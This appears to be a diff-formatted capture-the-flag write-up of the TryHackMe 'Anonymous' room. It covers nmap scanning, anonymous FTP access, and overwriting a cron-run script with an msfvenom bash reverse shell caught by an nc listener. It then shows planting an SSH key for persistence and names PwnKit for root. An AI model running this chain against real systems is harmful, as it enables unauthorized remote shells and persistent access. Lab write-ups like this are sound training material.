@@ -1,0 +1,147 @@
+https://tryhackme.com/room/anonymous
+
+We start with an nmap scan:
+$ nmap -sV 10.10.165.195
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-18 20:24 CEST
+Nmap scan report for 10.10.165.195
+Host is up (0.043s latency).
+Not shown: 996 closed ports
+PORT    STATE SERVICE     VERSION
+21/tcp  open  ftp         vsftpd 2.0.8 or later
+22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.26 seconds
+
+There's a few openings here.
+We have a ftp-server that might be open to anonymous login, and we have smb-shares
+that we can enumerate. Let's start with the ftp server.
+
+$ ftp anonymous@10.10.165.195
+Connected to 10.10.165.195.
+220 NamelessOne's FTP Server!
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||60543|)
+150 Here comes the directory listing.
+drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
+226 Directory send OK.
+ftp>
+
+Inside scripts/ we find 3 files:
+cat clean.sh
+#!/bin/bash
+
+tmp_files=0
+echo $tmp_files
+if [ $tmp_files=0 ]
+then
+        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
+else
+    for LINE in $tmp_files; do
+        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
+fi
+
+$ cat removed_files.log
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+Running cleanup script:  nothing to delete
+
+$ cat to_do.txt
+I really need to disable the anonymous login...it's really not safe
+
+It's possible that clean.sh runs as a cronjob, and since we have ftp-access
+we could replace it with a bash reverse-shell. 
+
+We can generate one using msfvenom:
+$ msfvenom -p cmd/unix/reverse_bash LHOST=our_ip LPORT=4444 -f raw -o clean.sh
+
+Let's start a listener:
+$ nc -lvnp 4444
+
+And place the reverse shell on the server:
+ftp> put clean.sh
+local: clean.sh remote: clean.sh
+229 Entering Extended Passive Mode (|||5783|)
+150 Ok to send data.
+100% |*****************************************************************************************************************|    70        1.75 MiB/s    00:00 ETA
+226 Transfer complete.
+70 bytes sent in 00:00 (0.83 KiB/s)
+
+And we got a connection more or less instantly:
+$ id
+uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+
+The server have python3 installed, so lets stabilize the shell as per the instructions
+in shells-cheat-sheet.
+
+Let's see if we can get a more permanent shell, rather than a reverse shell.
+Let's see if we can login via ssh.
+We have am ssh-server running:
+namelessone@anonymous:~$ ps aux|grep ssh
+root       934  0.0  0.5  72300  5572 ?        Ss   18:18   0:00 /usr/sbin/sshd -D
+
+However, we do not have a ~/.ssh:
+namelessone@anonymous:~$ ls .ssh
+ls: cannot access '.ssh': No such file or directory
+
+so let's create one and place public ssh-key in it.
+And now we can log in via ssh, and find the key in user.txt
+$ cat user.txt
+90d6f992585815ff991e68748c414740
+********************************
+
+And we can scan the SMB-shares by using smbmap (on the attack machine) just to
+see what we can find:
+$ smbmap -H 10.10.165.195
+[+] Guest session       IP: 10.10.165.195:445   Name: 10.10.165.195
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        print$                                                  NO ACCESS       Printer Drivers
+        pics                                                    READ ONLY       My SMB Share Directory for Pics
+        IPC$                                                    NO ACCESS       IPC Service (anonymous server (Samba, Ubuntu))
+
+Now lets try to get root. Let's poke around a bit before we run linpeas or enum4linux.
+
+From linpeas we can tell that it is possibly vulnerable to a few CVEs, including
+Pwnkit (CVE-2021-4034) which I was able to use to get root access.
+
+Although that is a bit boring solution. I played around a bit with SMB, but couldn't 
+quite find anything useful, but it's an area that I need to improve on. I'll read
+through the walkthroughs to see if I can find more interesting ways of gaining root
+on this machine.
+
